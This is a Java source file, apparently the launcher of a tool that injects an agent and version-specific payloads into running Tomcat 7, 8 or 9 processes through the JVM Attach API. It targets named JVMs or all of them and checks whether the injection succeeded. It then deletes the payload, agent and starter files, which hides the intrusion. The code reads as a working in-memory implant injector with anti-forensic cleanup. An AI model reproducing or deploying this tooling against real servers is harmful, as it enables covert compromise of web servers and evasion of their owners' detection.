import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;
import cons.Constant;
import util.ClientUtil;
import util.FileUtil;
import util.Logger;
import util.WebAppCheck;

import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class Main {

    public static void main(String[] args) throws Exception {
        Map<String, String> map = ClientUtil.getArgs(args);
        if (map == null) {
            return;
        }
        String assignName = map.get("assignName");
        String tomcat_version = map.get("tomcat_version");

        Logger.print("Will start in 3 seconds...");
        Thread.sleep(3000);
        String localDir = Constant.LOCAL_DIR;
        // Check whether the target application is started.
        while (!WebAppCheck.check()) {
            Logger.print("The target port is not open. Continue to try after 10 seconds...");
            Thread.sleep(10000);
        }

        // release lib jars
        FileUtil.releaseLibJar();
        // release agent.jar
        FileUtil.releaseFile("/agent/agent.jar", Constant.AGENT);
        // Generate web server configuration file
        FileUtil.generateConfig();

        String[] payloadPathArray = {
                "/payload/payload-tomcat-7.txt",
                "/payload/payload-tomcat-8.txt",
                "/payload/payload-tomcat-9.txt"
        };
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        Constant.AGENT_JAR_PATH = localDir + "/" + Constant.AGENT;
        boolean deleteStarter = true;
        List<String> pids = new ArrayList<String>();
        Logger.print("local_pid：" + Constant.LOCAL_PID);
        pids.add(Constant.LOCAL_PID);
        label:
        for (VirtualMachineDescriptor vmd : list) {
            String pid = vmd.id();
            if (vmd.displayName().equals(assignName) || "all".equals(assignName)) {
                try {
                    String payloadPath;
                    switch (tomcat_version) {
                        case "7":
                            payloadPath = payloadPathArray[0];
                            break;
                        case "8":
                            payloadPath = payloadPathArray[1];
                            break;
                        case "9":
                            payloadPath = payloadPathArray[2];
                            break;
                        default:
                            System.err.println("Incorrect input format! \"tomcat_version\"");
                            break label;
                    }
                    // release Payload
                    FileUtil.releaseFile(payloadPath, "Payload");
                    VirtualMachine vm = VirtualMachine.attach(pid);
                    vm.loadAgent(Constant.AGENT_JAR_PATH);
                    vm.detach();
                    Logger.print("injection pid:" + pid);
                    // Check whether the current Tomcat version can be successfully injected
                    if ("true".equals(FileUtil.getAgentConfig("success"))) {
                        Logger.print("Injection successful");
                        pids.add(pid);
                    } else {
                        System.err.println(payloadPath + "tomcat_version:" + tomcat_version + " Incorrect version, failed to inject successfully.");
                        Logger.tips();
                        deleteStarter = false;
                    }

                } catch (Exception ignored) {
                }
                //break;
            }
        }

        // clean up
        FileUtil.clean4windows(pids);
        FileUtil.delFile(Constant.TMP_DIR, Constant.AGENT_CONFIG_FILE);
        FileUtil.delFile(Constant.LOCAL_DIR, "Payload");
        FileUtil.delTmpLib();
        if (deleteStarter) {
            FileUtil.delFile(localDir, Constant.AGENT_STARTER);
        }
        FileUtil.delFile(localDir, Constant.AGENT);
    }
}
